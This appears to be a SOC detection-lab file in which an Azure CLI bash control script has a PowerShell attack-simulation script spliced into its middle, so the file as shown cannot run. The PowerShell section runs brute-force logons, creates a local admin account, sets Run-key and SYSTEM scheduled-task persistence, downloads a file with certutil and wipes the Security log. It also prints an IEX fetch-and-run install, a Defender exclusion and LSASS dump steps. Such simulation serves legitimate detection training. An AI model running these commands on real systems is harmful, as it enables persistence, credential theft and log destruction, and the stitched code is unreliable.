#!/usr/bin/env bash
# Redline lab control (Azure CLI). Requires: az login, correct subscription selected.
# Usage: ./lab-control.sh {start|stop|status|myip|query "<KQL>"}

set -euo pipefail
# Redline attack simulation. RUN INSIDE THE LAB VM (SC200-WS22) AS ADMINISTRATOR.
# Lab use only, on your own isolated test VM. Take a screenshot reminder after each run.
#
# Usage examples:
#   .\attack-sim.ps1 -Technique BruteForce
#   .\attack-sim.ps1 -Technique LocalAdmin
#   .\attack-sim.ps1 -Technique LocalAdmin -Cleanup
#   .\attack-sim.ps1 -Technique EncodedPS
#   .\attack-sim.ps1 -Technique RunKey
#   .\attack-sim.ps1 -Technique RunKey -Cleanup

param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("BruteForce", "LocalAdmin", "EncodedPS", "RunKey", "SchTask", "Certutil", "LSASS", "ClearLogs")]
    [string]$Technique,
    [switch]$Cleanup
)

$ErrorActionPreference = "Continue"

switch ($Technique) {

    "BruteForce" {   # T1110: generates event 4625 for a fake account
        1..8 | ForEach-Object { net use \\localhost\IPC$ /user:labfake "WrongPass$_" }
        Write-Host "Done. Wait 5-10 min, then check Incidents. Close any open brute-force incident first so a NEW one is created."
    }

    "LocalAdmin" {   # T1136.001 + T1098: events 4720 and 4732
        if ($Cleanup) { net user labtemp /delete; net user }
        else {
            net user labtemp "P@ssw0rd!2026x" /add
            net localgroup administrators labtemp /add
            Write-Host "Done. Run again with -Cleanup AFTER taking screenshots."
        }
    }

    "EncodedPS" {    # T1059.001: encoded PowerShell command line
        $cmd = 'whoami; hostname; Get-LocalUser'
        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
        powershell.exe -NoProfile -EncodedCommand $enc
    }

    "RunKey" {       # T1547.001: Run key persistence (current user)
        $key = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        if ($Cleanup) { reg delete $key /v RedlineLab /f }
        else { reg add $key /v RedlineLab /t REG_SZ /d "C:\Windows\System32\calc.exe" /f }
    }

    "SchTask" {      # T1053.005: scheduled task persistence
        if ($Cleanup) { schtasks /delete /tn RedlineLabTask /f }
        else { schtasks /create /tn RedlineLabTask /tr calc.exe /sc onlogon /ru SYSTEM /f }
    }

    "Certutil" {     # T1105: ingress tool transfer with a LOLBin (benign file)
        New-Item -ItemType Directory -Path C:\Temp -Force | Out-Null
        if ($Cleanup) { Remove-Item C:\Temp\redline_dl.txt -Force -ErrorAction SilentlyContinue }
        else { certutil -urlcache -split -f https://example.com/ C:\Temp\redline_dl.txt }
    }

    "LSASS" {        # T1003.001: use the Atomic Red Team test, not hand-rolled dumping
        Write-Host "Install Atomic Red Team first (exclude only C:\AtomicRedTeam from AV, keep real-time protection on):"
        Write-Host "  Add-MpPreference -ExclusionPath 'C:\AtomicRedTeam'"
        Write-Host "  IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -getAtomics"
        Write-Host "Then list tests and pick the comsvcs.dll LSASS memory test by number:"
        Write-Host "  Invoke-AtomicTest T1003.001 -ShowDetailsBrief"
        Write-Host "  Invoke-AtomicTest T1003.001 -TestNumbers <N> -GetPrereqs"
        Write-Host "  Invoke-AtomicTest T1003.001 -TestNumbers <N>"
        Write-Host "  Invoke-AtomicTest T1003.001 -TestNumbers <N> -Cleanup"
        Write-Host "Expect a real Defender alert and a pending action in the Action Center."
    }

    "ClearLogs" {    # T1070.001: RUN LAST. This wipes the local Security log (event 1102 is logged).
        Write-Warning "This clears the local Security event log. Run it last, after other telemetry has reached the workspace."
        wevtutil cl Security
    }
}

VM_RG="SC-200"
VM_NAME="SC200-WS22"
SOC_RG="Rg-soc-lab"
WORKSPACE="law-soc-lab"
NSG_NAME="SC200-WS22-nsg"
NSG_RULE="Allow-RDP-MyIP"

case "${1:-}" in
  start)
    az vm start -g "$VM_RG" -n "$VM_NAME"
    az vm show -d -g "$VM_RG" -n "$VM_NAME" --query "{state:powerState, ip:publicIps}" -o table
    ;;
  stop)
    # Deallocate (not just stop) so compute billing ends. Auto-shutdown is unavailable in this region.
    az vm deallocate -g "$VM_RG" -n "$VM_NAME"
    az vm get-instance-view -g "$VM_RG" -n "$VM_NAME" \
      --query "instanceView.statuses[?starts_with(code,'PowerState')].displayStatus" -o tsv
    ;;
  status)
    az vm get-instance-view -g "$VM_RG" -n "$VM_NAME" \
      --query "instanceView.statuses[?starts_with(code,'PowerState')].displayStatus" -o tsv
    ;;
  myip)
    # Updates the RDP rule to your current public IP (home IP changes).
    MYIP="$(curl -s https://api.ipify.org)"
    echo "Current public IP: $MYIP"
    az network nsg rule update -g "$VM_RG" --nsg-name "$NSG_NAME" -n "$NSG_RULE" \
      --source-address-prefixes "${MYIP}/32" \
      --query "{rule:name, source:sourceAddressPrefix, port:destinationPortRange, access:access}" -o table
    ;;
  query)
    # Runs a KQL query against the Sentinel workspace (Log Analytics tables only, e.g. SecurityEvent).
    # Defender Device* tables are queried in the Defender portal Advanced hunting, not here.
    : "${2:?Provide a KQL query string}"
    WS_ID="$(az monitor log-analytics workspace show -g "$SOC_RG" -n "$WORKSPACE" --query customerId -o tsv)"
    az monitor log-analytics query -w "$WS_ID" --analytics-query "$2" -o table
    ;;
  *)
    echo "Usage: $0 {start|stop|status|myip|query \"<KQL>\"}"
    exit 1
    ;;
esac
